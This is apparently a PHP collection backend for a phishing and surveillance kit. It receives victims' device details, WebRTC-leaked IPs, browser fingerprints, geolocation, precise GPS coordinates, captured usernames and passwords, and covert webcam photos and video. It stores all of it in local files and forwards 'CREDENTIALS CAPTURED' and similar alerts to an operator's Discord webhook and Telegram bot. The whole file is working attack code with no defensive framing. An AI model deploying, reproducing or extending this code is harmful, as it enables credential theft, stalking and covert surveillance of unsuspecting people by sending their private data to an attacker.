<?php
include 'config.php';

$type = $_POST['type'];
$data = $_POST['data'];
$ip = $_POST['ip'];
$msg = $_POST['msg'];

$log_entry = "";
$notification_msg = "";

// Handle different data types
if ($type === "basic") {
    $json = json_decode($data, true);
    $log_entry .= "\n[+] Device Info:\n";
    $log_entry .= "User Agent: " . $json['user_agent'] . "\n";
    $log_entry .= "Platform: " . $json['platform'] . "\n";
    $log_entry .= "Cores: " . $json['cores'] . "\n";
    $log_entry .= "Memory: " . $json['memory'] . " GB\n";
    $log_entry .= "Screen: " . $json['screen'] . "\n";
    $log_entry .= "Time: " . $json['local_time'] . "\n";
    
    $notification_msg = "📱 **New Target Connected!**\n" . $log_entry;

} elseif ($type === "webrtc") {
    $log_entry .= "\n[+] WebRTC Leak:\n";
    $log_entry .= "IP: " . $ip . "\n";
    
    // Save IP for main script
    $file = fopen("ip.txt", "a");
    fwrite($file, "IP: " . $ip . "\n");
    fclose($file);
    
    $notification_msg = "🕵️‍♂️ **WebRTC Leak Detected!**\nIP: " . $ip;

} elseif ($type === "fingerprint") {
    $json = json_decode($data, true);
    $log_entry .= "\n[+] Browser Fingerprint:\n";
    $log_entry .= "Canvas Hash: " . $json['canvas_hash'] . "\n";
    $log_entry .= "Resolution: " . $json['screen_res'] . "\n";
    $log_entry .= "Timezone: " . $json['timezone'] . "\n";
    
    $notification_msg = "🆔 **Fingerprint Collected**\nHash: " . $json['canvas_hash'];

} elseif ($type === "location") {
    $json = json_decode($data, true);
    $log_entry .= "\n[+] Location Info (IP API):\n";
    $log_entry .= "IP: " . $json['query'] . "\n";
    $log_entry .= "ISP: " . $json['isp'] . "\n";
    $log_entry .= "Country: " . $json['country'] . "\n";
    $log_entry .= "City: " . $json['city'] . "\n";
    
    // Save IP for main script
    $file = fopen("ip.txt", "a");
    fwrite($file, "IP: " . $json['query'] . "\n");
    fclose($file);
    
    // Save to captured_ips for Censys
    $file_ips = fopen("captured_ips.txt", "a");
    fwrite($file_ips, $json['query'] . "\n");
    fclose($file_ips);

    $notification_msg = "🌍 **Location Data**\nIP: " . $json['query'] . "\nISP: " . $json['isp'] . "\nLocation: " . $json['city'] . ", " . $json['country'];

} elseif ($type === "credentials") {
    $json = json_decode($data, true);
    $log_entry .= "\n[+] 🔑 CREDENTIALS CAPTURED!\n";
    $log_entry .= "Service: " . $_POST['service'] . "\n";
    $log_entry .= "Email/Username: " . $_POST['email'] . "\n";
    $log_entry .= "Password: " . $_POST['password'] . "\n";
    $log_entry .= "User ID: " . $_POST['uid'] . "\n";
    
    $notification_msg = "🔑 **CREDENTIALS CAPTURED!**\nService: " . $_POST['service'] . "\nEmail: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\nUser: " . $_POST['uid'];

} elseif ($type === "photo_capture") {
    $photo_data = $_POST['photo'];
    $uid = $_POST['uid'];
    
    // Save photo to file
    $photo_data = str_replace('data:image/jpeg;base64,', '', $photo_data);
    $photo_data = str_replace(' ', '+', $photo_data);
    $photo_binary = base64_decode($photo_data);
    $filename = "captures/photo_" . $uid . "_" . time() . ".jpg";
    
    if (!file_exists('captures')) {
        mkdir('captures', 0777, true);
    }
    
    file_put_contents($filename, $photo_binary);
    
    $log_entry .= "\n[+] 📸 PHOTO CAPTURED!\n";
    $log_entry .= "Saved to: " . $filename . "\n";
    $log_entry .= "User ID: " . $uid . "\n";
    
    $notification_msg = "📸 **PHOTO CAPTURED!**\nFile: " . $filename . "\nUser: " . $uid;

} elseif ($type === "video_capture") {
    $video_data = $_POST['video'];
    $uid = $_POST['uid'];
    
    // Save video to file
    $video_data = str_replace('data:video/webm;base64,', '', $video_data);
    $video_data = str_replace(' ', '+', $video_data);
    $video_binary = base64_decode($video_data);
    $filename = "captures/video_" . $uid . "_" . time() . ".webm";
    
    if (!file_exists('captures')) {
        mkdir('captures', 0777, true);
    }
    
    file_put_contents($filename, $video_binary);
    
    $log_entry .= "\n[+] 🎥 VIDEO CAPTURED!\n";
    $log_entry .= "Saved to: " . $filename . "\n";
    $log_entry .= "User ID: " . $uid . "\n";
    
    $notification_msg = "🎥 **VIDEO CAPTURED!**\nFile: " . $filename . "\nUser: " . $uid;

} elseif ($type === "gps") {
    $json = json_decode($data, true);
    $log_entry .= "\n[+] GPS Location (High Accuracy):\n";
    $log_entry .= "Lat: " . $json['lat'] . "\n";
    $log_entry .= "Lon: " . $json['lon'] . "\n";
    $log_entry .= "Accuracy: " . $json['acc'] . "m\n";
    if (isset($json['alt'])) $log_entry .= "Altitude: " . $json['alt'] . "m\n";
    if (isset($json['speed'])) $log_entry .= "Speed: " . $json['speed'] . "m/s\n";
    $google_maps = "https://www.google.com/maps/place/" . $json['lat'] . "," . $json['lon'];
    $log_entry .= "Maps: " . $google_maps . "\n";
    $log_entry .= "User ID: " . $json['uid'] . "\n";
    
    $notification_msg = "📍 **GPS Location Acquired!**\nMaps: " . $google_maps . "\nUser: " . $json['uid'];

} elseif ($type === "media_granted") {
    $json = json_decode($data, true);
    $log_entry .= "\n[+] CAMERA/MIC ACCESS GRANTED!\n";
    $log_entry .= "Video: " . ($json['video'] ? "YES" : "NO") . "\n";
    $log_entry .= "Audio: " . ($json['audio'] ? "YES" : "NO") . "\n";
    $log_entry .= "User ID: " . $json['uid'] . "\n";
    
    $notification_msg = "📸🎤 **CAMERA/MIC ACCESS GRANTED!**\nUser: " . $json['uid'];

} elseif ($type === "media_denied") {
    $log_entry .= "\n[!] Camera/Mic Access Denied\n";
    $log_entry .= "Reason: " . $msg . "\n";
    $log_entry .= "User ID: " . $_POST['uid'] . "\n";
    
    $notification_msg = "⚠️ **Media Access Denied**\nUser: " . $_POST['uid'];

} elseif ($type === "error") {
    $log_entry .= "\n[!] Error: " . $msg . "\n";
    if (isset($_POST['uid'])) {
        $log_entry .= "User ID: " . $_POST['uid'] . "\n";
        $notification_msg = "⚠️ **Error:** " . $msg . "\nUser: " . $_POST['uid'];
    } else {
        $notification_msg = "⚠️ **Error:** " . $msg;
    }
}

// Save to data.txt
if (!empty($log_entry)) {
    $file = fopen("data.txt", "a");
    fwrite($file, $log_entry . "\n-------------------\n");
    fclose($file);
}

// Send Notifications
if (!empty($notification_msg)) {
    // Discord
    if (!empty($discord_webhook)) {
        $json_data = json_encode(["content" => $notification_msg]);
        $ch = curl_init($discord_webhook);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
        curl_close($ch);
    }

    // Telegram
    if (!empty($telegram_bot_token) && !empty($telegram_chat_id)) {
        $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
        $data = ['chat_id' => $telegram_chat_id, 'text' => $notification_msg, 'parse_mode' => 'Markdown'];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
